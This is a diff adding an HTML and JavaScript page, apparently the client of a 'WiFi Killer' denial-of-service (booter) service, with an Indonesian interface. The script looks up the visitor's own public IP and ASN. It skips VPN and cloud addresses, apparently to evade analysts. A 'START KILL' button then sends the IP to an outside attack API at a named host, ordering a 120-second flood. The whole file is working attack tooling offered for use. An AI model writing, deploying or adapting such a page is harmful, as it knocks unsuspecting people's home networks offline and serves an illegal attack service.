@@ -1,0 +1,179 @@
+<!-- wifi_internal.html -->
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WiFi Killer Internal - Vortex Ghost</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0D0221; color: #fff; font-family: 'Share Tech Mono', monospace;
+            min-height: 100vh; background: linear-gradient(180deg, #0D0221 0%, #1A0533 50%, #0D0221 100%);
+        }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: transparent; }
+        ::-webkit-scrollbar-thumb { background: #7B1FA2; border-radius: 4px; }
+
+        .app-header {
+            display: flex; align-items: center; padding: 16px 20px;
+            background: rgba(13,2,33,0.95); border-bottom: 1px solid rgba(234,128,252,0.1);
+            position: sticky; top: 0; z-index: 10;
+        }
+        .app-header .back-btn {
+            background: none; border: none; color: #EA80FC; font-size: 20px;
+            cursor: pointer; padding: 4px; margin-right: 12px;
+        }
+        .app-header .title {
+            font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: 16px;
+            color: #fff; flex: 1; text-align: center;
+        }
+
+        .container { max-width: 500px; margin: 0 auto; padding: 16px 20px; padding-bottom: 40px; }
+
+        .info-card {
+            background: rgba(255,255,255,0.05); border-radius: 16px; padding: 16px;
+            border: 1px solid rgba(123,31,162,0.2); margin-bottom: 16px;
+        }
+        .info-card .item {
+            display: flex; justify-content: space-between; padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .info-card .item:last-child { border-bottom: none; }
+        .info-card .item .label { color: rgba(255,255,255,0.5); font-size: 13px; }
+        .info-card .item .value { color: #fff; font-size: 14px; font-weight: 600; }
+
+        .btn-attack {
+            width: 100%; padding: 18px; border: none; border-radius: 16px;
+            font-family: 'Orbitron', sans-serif; font-weight: 700; font-size: 16px;
+            cursor: pointer; transition: all 0.2s; margin-bottom: 16px;
+            background: linear-gradient(135deg, #7B1FA2, #EA80FC); color: #fff;
+            box-shadow: 0 8px 30px rgba(123,31,162,0.3);
+        }
+        .btn-attack:hover { transform: scale(1.02); }
+        .btn-attack:disabled { opacity: 0.6; cursor: not-allowed; transform: scale(1); }
+        .btn-attack .spinner { display: none; width: 24px; height: 24px; margin: 0 auto; border: 3px solid rgba(255,255,255,0.2); border-top: 3px solid #fff; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .btn-attack.loading .btn-text { display: none; }
+        .btn-attack.loading .spinner { display: block; }
+
+        .vpn-warning {
+            background: rgba(123,31,162,0.2); border: 1px solid rgba(234,128,252,0.2);
+            border-radius: 16px; padding: 16px; text-align: center; margin-bottom: 16px;
+            display: none;
+        }
+        .vpn-warning.show { display: block; }
+        .vpn-warning p { color: rgba(255,255,255,0.7); font-size: 14px; }
+
+        .toast {
+            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
+            max-width: 500px; width: calc(100% - 32px); padding: 14px 20px;
+            border-radius: 12px; font-size: 14px; font-weight: 600; z-index: 2000;
+            display: none; text-align: center; box-shadow: 0 8px 30px rgba(0,0,0,0.6);
+            animation: slideUp 0.3s ease;
+        }
+        .toast.show { display: block; }
+        .toast.success { background: rgba(76,175,80,0.9); color: #fff; }
+        .toast.error { background: rgba(255,0,0,0.85); color: #fff; }
+        .toast.info { background: rgba(123,31,162,0.9); color: #fff; }
+        @keyframes slideUp { from { opacity:0; transform:translateX(-50%) translateY(20px); } to { opacity:1; transform:translateX(-50%) translateY(0); } }
+    </style>
+</head>
+<body>
+    <header class="app-header">
+        <button class="back-btn" onclick="window.location.href='dashboard.html'"><i class="fas fa-arrow-left"></i></button>
+        <span class="title">📡 WIFI KILLER (INTERNAL)</span>
+        <div style="width:36px;"></div>
+    </header>
+    <div class="container">
+        <div class="info-card" id="infoCard">
+            <div class="item"><span class="label">IP Address</span><span class="value" id="ipAddress">-</span></div>
+            <div class="item"><span class="label">Region</span><span class="value" id="region">-</span></div>
+            <div class="item"><span class="label">ASN</span><span class="value" id="asn">-</span></div>
+        </div>
+
+        <div class="vpn-warning" id="vpnWarning"><p>⚠️ Target berasal dari VPN/Hosting. Serangan dibatalkan.</p></div>
+
+        <button class="btn-attack" id="attackBtn" onclick="startAttack()">
+            <span class="btn-text"><i class="fas fa-wifi"></i> START KILL</span>
+            <span class="spinner"></span>
+        </button>
+
+        <div id="statusMsg" style="color:rgba(255,255,255,0.5);font-size:13px;text-align:center;min-height:20px;"></div>
+    </div>
+    <div class="toast" id="toast"></div>
+
+    <script>
+        const API_BASE = 'http://private.lynzzofficial.com:2355';
+        const sessionKey = localStorage.getItem('sessionKey') || '';
+        const username = localStorage.getItem('username') || '';
+        let publicIp = '-', region = '-', asn = '-', isVpn = false, isAttacking = false;
+
+        function showToast(msg, type='info') {
+            const t = document.getElementById('toast');
+            t.textContent = msg; t.className = 'toast show ' + type;
+            clearTimeout(t._timer); t._timer = setTimeout(() => { t.className = 'toast'; }, 3000);
+        }
+
+        async function loadPublicInfo() {
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipJson = await ipRes.json();
+                publicIp = ipJson.ip;
+
+                const infoRes = await fetch(`http://ip-api.com/json/${publicIp}?fields=as,regionName,status,query`);
+                const info = await infoRes.json();
+                region = info.regionName || '-';
+                asn = info.as || '-';
+                const asnLower = asn.toLowerCase();
+                isVpn = asnLower.includes('vpn') || asnLower.includes('cloud') || asnLower.includes('digitalocean') ||
+                        asnLower.includes('aws') || asnLower.includes('google');
+
+                document.getElementById('ipAddress').textContent = publicIp;
+                document.getElementById('region').textContent = region;
+                document.getElementById('asn').textContent = asn;
+
+                if (isVpn) {
+                    document.getElementById('vpnWarning').classList.add('show');
+                    document.getElementById('attackBtn').disabled = true;
+                }
+            } catch (e) {
+                document.getElementById('ipAddress').textContent = 'Error';
+                document.getElementById('region').textContent = 'Error';
+                document.getElementById('asn').textContent = 'Error';
+            }
+        }
+
+        window.startAttack = function() {
+            if (isAttacking || isVpn) return;
+            isAttacking = true;
+            const btn = document.getElementById('attackBtn');
+            btn.classList.add('loading');
+            btn.disabled = true;
+            document.getElementById('statusMsg').textContent = '⏳ Mengirim serangan...';
+
+            fetch(`${API_BASE}/killWifi?key=${sessionKey}&target=${publicIp}&duration=120`)
+                .then(res => res.json())
+                .then(data => {
+                    isAttacking = false;
+                    btn.classList.remove('loading');
+                    btn.disabled = false;
+                    document.getElementById('statusMsg').textContent = '✅ Attack sent!';
+                    showToast('✅ Attack sent to ' + publicIp, 'success');
+                })
+                .catch(err => {
+                    isAttacking = false;
+                    btn.classList.remove('loading');
+                    btn.disabled = false;
+                    document.getElementById('statusMsg').textContent = '❌ Error: ' + err.message;
+                    showToast('❌ Error: ' + err.message, 'error');
+                });
+        };
+
+        if (!sessionKey || !username) window.location.href = 'login.html';
+        loadPublicInfo();
+    </script>
+</body>
+</html>
